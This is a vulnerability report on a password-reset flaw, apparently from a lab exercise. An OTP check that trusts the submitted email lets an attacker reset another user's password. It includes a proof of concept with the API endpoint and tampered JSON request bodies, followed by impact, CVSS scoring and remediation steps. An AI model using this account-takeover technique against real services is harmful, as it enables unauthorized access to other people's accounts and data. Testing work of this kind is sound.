# 🔐 Broken User Authentication

## 📖 Vulnerability Description

Broken User Authentication occurs when an application fails to properly secure authentication or account recovery mechanisms, allowing attackers to compromise user accounts.

During testing, it was discovered that the `password reset functionality does not properly validate the association between the OTP and the requesting user account`.  

This flaw allows an attacker to **reset the password of another user account** by submitting an OTP verification request containing a **different email address**.

⚠️ This results in **unauthorized account takeover**.

---

## ⚙️ Affected Functionality

### 🔑 Password Reset Workflow

```
[http://192.168.1.28:8888/forgot-password](http://192.168.1.28:8888/forgot-password)
```

### 🌐 API Endpoint

```
POST /identity/api/auth/v2/check-otp
```

---

## 🧪 Proof of Concept (PoC)

### Step 1 – Initiate Password Reset

Navigate to:

```
[http://192.168.1.28:8888/forgot-password](http://192.168.1.28:8888/forgot-password)
```
- Request an OTP for a user account
---

##  Step 2 – Intercept OTP Verification Request

Capture the request using an **interception proxy** (e.g., Burp Suite).

### 📡 Example Request

```
POST /identity/api/auth/v2/check-otp HTTP/1.1
Host: 192.168.1.28:8888
Content-Type: application/json
````

### 📦 Payload

```json
{
  "email": "rahuljain+2@gmail.com",
  "otp": "9557",
  "password": "Password123a"
}
```

---

## 🎯 Step 3 – Modify Target Account

Change the **email parameter** to another user account while keeping the valid OTP.

### ✏️ Example

```json
{
  "email": "victim@example.com",
  "otp": "9557",
  "password": "Password123a"
}
```

This demonstrates that the **OTP is not properly bound to the requesting user account**, allowing attackers to reset the password for another user.

### Result

⚠️ This results in **unauthorized account takeover**.

---

## ✅ Expected Result

The application should verify that:

- 🔗 The **OTP belongs to the same email address**
- 🔒 The **OTP session is tied to the original password reset request**
- 🚫 The **OTP cannot be reused for other accounts**

### 🖥️ The server should return:

```
403 Forbidden
```

**or**

```
Invalid OTP
```

---

## 🚨 Security Impact

Successful exploitation allows attackers to:

- 🔑 Reset passwords of **arbitrary users**
- 👤 **Take over user accounts**
- 📂 Access **sensitive data**
- ⚙️ Perform **actions as other users**

### ⚠️ Potential consequences include:

- 🚗 **Unauthorized vehicle tracking**
- 📜 Access to **orders and service history**
- 🧾 Exposure of **personal information**
- 🛠️ **Abuse of application functionality**

---

## 🔥 Severity

**Critical**

## 📊 CVSS v3.1 Example

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
Score: 9.1 (Critical)
```

---

## 🧩 Root Cause

The password reset mechanism fails to **bind the OTP verification to the original password reset request and associated user account**.

The API **trusts the `email` parameter provided in the request** instead of validating it against the **OTP issuance record**.

As a result, an attacker can modify the email parameter and **reuse a valid OTP to reset another user's password**.

---

## 🛠️ Recommended Remediation

### 1️⃣ Bind OTP to User Account

The OTP should be stored together with the **user identifier**.

**Example database structure**

```
email | otp | expiry | used
```

### 🔍 During Verification

The server should:

- Verify that the **OTP matches the stored OTP for the same email**
- Ensure the **OTP has not expired**
- Confirm the **OTP has not been used**
- Ensure the **OTP belongs to the original password reset session**

This prevents attackers from **reusing OTPs across different user accounts**.

---

## 🛠️ 2. Use Secure Reset Tokens Instead of Raw OTP Validation

### 🔁 Recommended Flow

1️⃣ User requests **password reset**  
2️⃣ Server generates a **unique reset token**  
3️⃣ Token is **tied to the user account**  
4️⃣ Token **expires after a short time**

---

## ⏳ 3. Enforce OTP Expiration

Example:

```
OTP expiry = 5 minutes
```

This ensures that OTPs **cannot be reused after a short period**, reducing the attack window.

---

## 🚦 4. Implement Rate Limiting

Limit attempts such as:

```
5 OTP attempts per account
```

This prevents **OTP brute-force attacks**.

---

## 🔁 5. Mark OTP as Used After Successful Reset

Prevent reuse of the same OTP.

Once the password reset is successful, the system should **invalidate or mark the OTP as used**.

---

## 📊 6. Implement Logging and Monitoring

Detect suspicious activities such as:

- 📌 Multiple OTP attempts
- 🔄 Password reset attempts across different accounts
- 🌐 Requests from unusual IP addresses
- ⚠️ Repeated failed OTP verification attempts

Proper logging helps **detect attacks and respond quickly**.
